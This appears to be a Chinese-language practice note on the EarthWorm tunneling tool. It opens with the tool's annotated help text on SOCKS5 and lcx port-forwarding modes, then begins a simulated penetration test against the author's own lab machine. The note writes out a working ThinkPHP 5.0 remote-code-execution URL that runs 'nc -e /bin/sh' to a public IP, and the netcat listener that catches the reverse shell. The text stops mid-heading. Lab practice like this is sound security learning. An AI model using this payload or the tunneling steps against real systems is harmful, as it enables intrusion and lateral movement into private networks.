
# - -help 
```
VERSION : free 1.0 
 ./xxx ([-options] [values])*
 options :
 Eg: ./xxx -s ssocksd -h 
 -s state setup the function.You can pick one from the 
 following options:
 ssocksd , rcsocks , rssocks , 
 lcx_listen , lcx_tran , lcx_slave
 # -s 选项选择连接模式，除了lcx的三种模式还有ssocksd正向SOCKS V5服务器、（rcsocks(公网监听转发主机)、rssocks（目标主机））反弹SOCKS V5服务器。
 -l listenport open a port for the service startup.#监听端口
 -d refhost set the reflection host address.#设置反射主机地址（公网IP）
 -e refport set the reflection port.#设置转发到的端口
 -f connhost set the connect host address .#设置连接主机地址（参考lcx的h2）要把这台内网主机的流量转发到公网上
 -g connport set the connect port.#设置要转发出去的端口（参考lcx的p2）
 -h help show the help text, By adding the -s parameter,
 you can also see the more detailed help.# 可以使用 ./ew -s [ssocksd|rcsocks|rssocks|lcx_listen|lcx_tran|lcx_slave]等获取关于具体模式的帮助
 -a about show the about pages # 显示关于
 -v version show the version. #显示版本
 -t usectime set the milliseconds for timeout. The default 
 value is 1000 #忙猜设置超时时间，默认1000  英语不好也可以猜
 ......
```

# 参考教程敲一遍（做个小模拟渗透）
**注：** 
- 攻击机位于我的笔记本上的kali nat联网 ip：192.168.153.133
- 被攻击的是校内我搭建的靶机 ip:10.203.87.64  环境：tp5.0
- 公网主机：45.\*.\*.190
## 做个小模拟渗透
利用命令执行弹shell
  
这次用NC弹shell
http://10.203.87.64/tp5/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=nc%20-e%20/bin/sh%2045.76.101.190%201235


公网服务器上面监听：
nc -l -p 1235


## 使用lcx相关的功能
### 将

